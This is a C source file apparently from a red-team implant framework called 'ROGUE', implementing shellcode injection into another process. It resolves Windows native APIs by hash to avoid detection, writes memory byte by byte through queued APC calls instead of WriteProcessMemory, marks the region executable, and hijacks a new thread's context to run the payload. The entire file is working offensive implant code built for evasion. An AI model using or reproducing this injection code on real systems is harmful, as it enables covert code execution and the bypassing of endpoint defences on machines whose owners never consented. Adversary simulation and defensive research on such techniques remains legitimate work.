/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

#ifdef RtlFillMemory
#undef RtlFillMemory

VOID
NTAPI
RtlFillMemory(
	_In_ LPVOID Destination,
	_In_ SIZE_T Length,
	_In_ UINT8 Fill
);

#endif

typedef struct
{
	D_API( NtQueryInformationProcess );
	D_API( NtQueryInformationThread );
	D_API( NtAllocateVirtualMemory );
	D_API( NtProtectVirtualMemory );
	D_API( NtWaitForSingleObject );
	D_API( NtFreeVirtualMemory );
	D_API( NtGetContextThread );
	D_API( NtSetContextThread );
	D_API( RtlExitUserThread );
	D_API( NtCreateThreadEx );
	D_API( NtQueueApcThread );
	D_API( NtResumeThread );
	D_API( NtOpenProcess );
	D_API( RtlFillMemory );
	D_API( NtClose );
} API ;

typedef struct __attribute__(( packed ))
{
	UINT64	StartAddr;
	UINT32	ProcessId;
	UINT32	StackSize;
	UINT32	Length;
	UINT8	Buffer[0];
} ROGUE_TASK_REQ_EXEC, *PROGUE_TASK_REQ_EXEC ;

typedef struct __attribute__(( packed ))
{
	UINT64	Address;
} ROGUE_TASK_REP_EXEC, *PROGUE_TASK_REP_EXEC ;

/* API Hashes */
#define H_API_NTQUERYINFORMATIONPROCESS		0x8cdc5dc2 /* NtQueryInformationProcess */
#define H_API_NTQUERYINFORMATIONTHREAD		0xf5a0461b /* NtQueryInformationThread */
#define H_API_NTALLOCATEVIRTUALMEMORY		0xf783b8ec /* NtAllocateVirtualMEmory */
#define H_API_NTPROTECTVIRTUALMEMORY		0x50e92888 /* NtProtectVirtualMemory */
#define H_API_NTWAITFORSINGLEOBJECT		0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_NTFREEVIRTUALMEMORY		0x2802c609 /* NtFreeVirtualMemory */
#define H_API_NTGETCONTEXTTHREAD		0x6d22f884 /* NtGetContextThread */
#define H_API_NTSETCONTEXTTHREAD		0xffa0bf10 /* NtSetContextThread */
#define H_API_RTLEXITUSERTHREAD			0x2f6db5e8 /* RtlExitUserThread */
#define H_API_NTCREATETHREADEX			0xaf18cfb0 /* NtCreateThreadEx */
#define H_API_NTQUEUEAPCTHREAD			0x0a6664b8 /* NtQueueApcThread */
#define H_API_NTRESUMETHREAD			0x5a4bc3d0 /* NtResumeThread */
#define H_API_NTOPENPROCESS			0x4b82f718 /* NtOpenProcess */
#define H_API_RTLFILLMEMORY			0x89ab5f57 /* RtlFillMemory */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Internal acts a 'WriteProcessMemory' atlernative.
 *
!*/
static D_SEC( B ) NTSTATUS InternalWriteProcessMemory( _In_ HANDLE Process, _In_ PVOID Address, _In_ PUINT8 Buffer, _In_ SIZE_T Length )
{
	API				Api;
	THREAD_BASIC_INFORMATION	Tbi;

	HANDLE				Thd = NULL;
	NTSTATUS			Nst = STATUS_SUCCESS;

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Tbi, sizeof( Tbi ) );

	Api.NtQueryInformationThread = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTQUERYINFORMATIONTHREAD ) ); 
	Api.NtWaitForSingleObject    = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTWAITFORSINGLEOBJECT ) );
	Api.RtlExitUserThread        = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_RTLEXITUSERTHREAD ) );
	Api.NtCreateThreadEx         = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTCREATETHREADEX ) );
	Api.NtQueueApcThread         = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTQUEUEAPCTHREAD ) );
	Api.NtResumeThread           = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTRESUMETHREAD ) );
	Api.RtlFillMemory            = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_RTLFILLMEMORY ) );
	Api.NtClose                  = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTCLOSE ) );

	/* Write one byte at a time */
	for ( SIZE_T Len = 0 ; Len < Length && NT_SUCCESS( Nst ) ; ++Len ) {
		/* Create a suspended thread pointing @ the exit thread routine */
		if( NT_SUCCESS( ( Nst = Api.NtCreateThreadEx( &Thd, THREAD_ALL_ACCESS, NULL, Process, Api.RtlExitUserThread, STATUS_SUCCESS, TRUE, NULL, 0x1000 * 4, 0, NULL ) ) ) ) {
			/* Queue a call to fill the current address space with a byte of memory */
			if ( NT_SUCCESS( ( Nst = Api.NtQueueApcThread( Thd, Api.RtlFillMemory, C_PTR( U_PTR( Address ) + Len ), C_PTR( U_PTR( 1 ) ), *( UINT8 * )( U_PTR( U_PTR( Buffer ) + Len ) ) ) ) ) ) {
				/* Resume the thread and force the APCS to call! */
				if ( NT_SUCCESS( ( Nst = Api.NtResumeThread( Thd, NULL ) ) ) ) {
					if ( NT_SUCCESS( ( Nst = Api.NtWaitForSingleObject( Thd, FALSE, NULL ) ) ) ) {
						/* Query the info about the thread */
						if ( NT_SUCCESS( ( Nst = Api.NtQueryInformationThread( Thd, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL ) ) ) ) {
							/* Get the exit status */
							Nst = NT_SUCCESS( Tbi.ExitStatus );
						};
					};
				};
			};
			/* Close the current thread */
			Api.NtClose( Thd );
		};
	};

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Tbi, sizeof( Tbi ) );

	/* Return! */
	return Nst;
};

/*!
 *
 * Purpose:
 *
 * Injects a specified process with the shellcode.
 *
!*/
D_SEC( B ) BOOLEAN CtlInject( _In_ PROGUE_CTX Context, _In_ PVOID Buffer, _In_ UINT32 Length, _Out_ PBUFFER Output )
{
	API			Api;
	CONTEXT			Ctx;
	CLIENT_ID		Cid;
	OBJECT_ATTRIBUTES	Att;


	ULONG			Prt = 0;
	SIZE_T			Len = 0;
	BOOLEAN			Ret = FALSE;
	NTSTATUS		Nst = 0;

	LPVOID			Ptr = NULL;
	HANDLE			Thd = NULL;
	HANDLE			Prc = NULL;
	PBUFFER			Out = NULL;
	PROGUE_TASK_REP_EXEC	Rtp = NULL;
	PROGUE_TASK_REQ_EXEC	Rtq = NULL;

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlZeroMemory( &Cid, sizeof( Cid ) );
	RtlZeroMemory( &Att, sizeof( Att ) );

	if ( Length <= sizeof( ROGUE_TASK_REQ_EXEC ) ) {
		/* Notify that we hit an invalid parameter */
		NtCurrentTeb()->LastErrorValue = STATUS_INVALID_PARAMETER;

		/* Abort! */
		return FALSE;
	};

	Api.NtQueryInformationProcess = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTQUERYINFORMATIONPROCESS ) );
	Api.NtAllocateVirtualMemory   = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTALLOCATEVIRTUALMEMORY ) );
	Api.NtProtectVirtualMemory    = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTPROTECTVIRTUALMEMORY ) );
	Api.NtFreeVirtualMemory       = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTFREEVIRTUALMEMORY ) );
	Api.NtGetContextThread        = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTGETCONTEXTTHREAD ) );
	Api.NtSetContextThread        = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTSETCONTEXTTHREAD ) );
	Api.NtCreateThreadEx          = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTCREATETHREADEX ) );
	Api.NtResumeThread            = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTRESUMETHREAD ) );
	Api.NtOpenProcess             = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTOPENPROCESS ) );
	Api.NtClose                   = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTCLOSE ) );

	Rtq = C_PTR( Buffer );
	Cid.UniqueProcess = C_PTR( Rtq->ProcessId );

	/* Initialize the attributes */
	InitializeObjectAttributes( &Att, NULL, 0, NULL, NULL );

	/* Open the target process ! */
	if ( NT_SUCCESS( ( Nst = Api.NtOpenProcess( &Prc, PROCESS_ALL_ACCESS, &Att, &Cid ) ) ) ) {

		/* Allocate a buffer for the shellcode */
		Len = Rtq->Length;

		/* Allocate a buffer */
		if ( NT_SUCCESS( ( Nst = Api.NtAllocateVirtualMemory( Prc, &Ptr, 0, &Len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE ) ) ) ) {
			
			/* Write the remote process memory using ROP */
			if ( NT_SUCCESS( ( Nst = InternalWriteProcessMemory( Prc, Ptr, Rtq->Buffer, Rtq->Length ) ) ) ) {

				/* Set the new protection */
				if ( NT_SUCCESS( ( Nst = Api.NtProtectVirtualMemory( Prc, &Ptr, &Len, PAGE_EXECUTE_READ, &Prt ) ) ) ) {

					/* Create the thread 'fix this!' */
					if ( NT_SUCCESS( ( Nst = Api.NtCreateThreadEx( &Thd, THREAD_ALL_ACCESS, NULL, Prc, Rtq->StartAddr, NULL, TRUE, 0, Rtq->StackSize, 0, NULL ) ) ) ) {

						Ctx.ContextFlags = CONTEXT_FULL;

						/* Acquire the thread context */
						if ( NT_SUCCESS( ( Nst = Api.NtGetContextThread( Thd, &Ctx ) ) ) ) {
							#if defined( _WIN64 )
							/* RtlUserThreadStart(
							 * @rcx = Func
							 * @rdx = Arg
							 * ); */
							Ctx.Rcx = U_PTR( Ptr );
							#else
							/* RtlUserThreadStart(
							 * @eax = Func
							 * @edx = Arg
							 * ); */
							Ctx.Eax = U_PTR( Ptr );
							#endif

							Ctx.ContextFlags = CONTEXT_FULL;

							if ( NT_SUCCESS( Nst ) ) {
								/* Set the new context */
								if ( NT_SUCCESS( ( Nst = Api.NtSetContextThread( Thd, &Ctx ) ) ) ) {

									/* Resume the thread */
									if ( NT_SUCCESS( ( Nst = Api.NtResumeThread( Thd, NULL ) ) ) ) {

										/* Create the output buffer */
										if ( ( Out = BufferCreate() ) != NULL ) {
											/* Extend the address */
											if ( BufferExtend( Out, sizeof( ROGUE_TASK_REP_EXEC ) ) ) {
												Rtp = C_PTR( Out->Buffer );
												Rtp->Address = C_PTR( Ptr );

												/* Add an output buffer */
												Ret = BufferAddRaw( Output, Out->Buffer, Out->Length );
											};
											/* Clear the output buffer */
											BufferClear( Out );
										};
									};
								};
							};
						};
						/* Close the reference */
						Api.NtClose( Thd );
					};
				};
			};
		};
		/* Close the reference */
		Api.NtClose( Prc );
	};

	/* Did we fail? */
	if ( ! NT_SUCCESS( Nst ) ) {
		/* Set the last error */
		NtCurrentTeb()->LastErrorValue = Nst;
	};

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlZeroMemory( &Cid, sizeof( Cid ) );
	RtlZeroMemory( &Att, sizeof( Att ) );

	return Ret;
};
